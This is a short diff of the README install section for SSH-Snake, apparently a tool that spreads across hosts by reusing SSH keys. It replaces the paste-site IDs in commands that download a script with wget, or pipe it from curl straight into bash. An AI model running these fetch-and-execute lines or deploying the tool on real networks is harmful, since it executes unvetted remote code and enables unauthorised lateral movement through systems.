@@ -55,9 +55,9 @@ stdbuf -o0 bash ./Snake.nocomments.sh
 
 
 ```bash
-wget https://haste-by-trkn.replit.app/raw/wiwoyutuxibo
+wget https://haste-by-trkn.replit.app/raw/tavitaxozehi
 or
-stdbuf -o0 bash ./wiwoyutuxibo
+stdbuf -o0 bash ./tavitaxozehi
 ```
 
 or
@@ -66,7 +66,7 @@ curl https://raw.githubusercontent.com/MegaManSec/SSH-Snake/main/Snake.nocomment
 ```
 or
 ```bash
-curl https://haste-by-trkn.replit.app/raw/wiwoyutuxibo | stdbuf -o0 bash
+curl https://haste-by-trkn.replit.app/raw/tavitaxozehi | stdbuf -o0 bash
 ```
 
 # About SSH-Snake
